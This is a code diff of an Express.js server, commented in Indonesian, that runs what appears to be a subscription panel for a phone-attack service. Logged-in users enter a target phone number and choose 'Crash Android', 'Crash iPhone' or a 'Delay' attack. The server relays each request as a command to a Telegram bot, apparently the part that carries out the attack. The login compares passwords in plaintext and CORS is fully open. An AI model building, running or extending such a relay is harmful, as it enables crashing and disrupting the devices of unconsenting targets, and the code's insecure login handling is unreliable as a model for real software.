@@ -1,72 +1,88 @@
 // server.js
 import express from "express";
-import fetch from "node-fetch";
+import cors from "cors";
+import bodyParser from "body-parser";
 import accounts from "./account.js";
 
 const app = express();
-app.use(express.json());
+app.use(cors());
+app.use(bodyParser.json());
 
-// ======== KONFIGURASI TELEGRAM ========
-const TELEGRAM_BOT_TOKEN = "ISI_TOKEN_BOT_LU";
-const TELEGRAM_CHAT_ID = "ISI_CHAT_ID_LU";
+// token + chat id buat bot telegram
+const TELEGRAM_TOKEN = "ISI_TOKEN_BOT_LU";
+const CHAT_ID = "ISI_CHAT_ID_LU";
 
-// ======== ENDPOINT ACCOUNT LOGIN ========
-app.get("/api/account", (req, res) => {
-  res.json(accounts);
-});
+// simulasi command
+const commands = [
+  { type: "Crash Android", command: "/crashandro" },
+  { type: "Crash iPhone", command: "/crashios" },
+  { type: "Delay Android", command: "/delayandro" },
+  { type: "Delay iPhone", command: "/delayios" }
+];
 
-// ======== ENDPOINT KIRIM BUG ========
-app.post("/api/send-bug", async (req, res) => {
-  try {
-    const { number, type } = req.body;
+// ========== LOGIN ==========
+app.post("/api/login", (req, res) => {
+  const { username, password } = req.body;
+  const user = accounts.find(
+    (acc) => acc.username === username && acc.password === password
+  );
 
-    // Mapping tipe bug ke command bot
-    const commandMap = {
-      "crash-android": "/crashandro",
-      "crash-iphone": "/crashios",
-      "delay-android": "/delayandro",
-      "delay-iphone": "/delayios"
-    };
-
-    const cmd = commandMap[type];
-    if (!cmd) {
-      return res.status(400).json({ success: false, message: "Tipe bug tidak valid" });
-    }
-
-    const text = `${cmd} ${number}`;
-
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    const body = {
-      chat_id: TELEGRAM_CHAT_ID,
-      text
-    };
-
-    await fetch(url, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(body)
-    });
-
-    res.json({ success: true, message: "Bug terkirim ke Telegram" });
-  } catch (err) {
-    console.error("Error send bug:", err);
-    res.status(500).json({ success: false, message: "Gagal mengirim bug" });
+  if (!user) {
+    return res.json({ success: false, message: "Username / password salah" });
   }
+
+  const now = new Date();
+  const expired = new Date(user.expired);
+
+  if (now > expired) {
+    return res.json({ success: false, message: "Akun sudah expired" });
+  }
+
+  res.json({
+    success: true,
+    username: user.username,
+    expired: user.expired
+  });
 });
 
-// ======== ENDPOINT LIST COMMAND ========
+// ========== LOGOUT ==========
+app.post("/api/logout", (req, res) => {
+  res.json({ success: true });
+});
+
+// ========== COMMAND LIST ==========
 app.get("/api/commands", (req, res) => {
-  const commands = [
-    { type: "crash-android", command: "/crashandro", description: "Crash Android target" },
-    { type: "crash-iphone", command: "/crashios", description: "Crash iPhone target" },
-    { type: "delay-android", command: "/delayandro", description: "Delay Android target" },
-    { type: "delay-iphone", command: "/delayios", description: "Delay iPhone target" }
-  ];
   res.json({ success: true, commands });
 });
 
-// ======== START SERVER ========
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-  console.log(`Server running at http://localhost:${PORT}`);
+// ========== SEND BUG ==========
+app.post("/api/send-bug", async (req, res) => {
+  const { number, type } = req.body;
+  const cmd = commands.find((c) => c.type === type);
+
+  if (!cmd) {
+    return res.json({ success: false, message: "Command tidak ditemukan" });
+  }
+
+  const message = `${cmd.command} ${number}`;
+
+  try {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: message
+      })
+    });
+
+    res.json({ success: true, message: "Bug terkirim ke Telegram" });
+  } catch (e) {
+    res.json({ success: false, message: "Gagal kirim ke Telegram" });
+  }
+});
+
+// run server
+app.listen(3000, () => {
+  console.log("Server jalan di http://localhost:3000");
 });
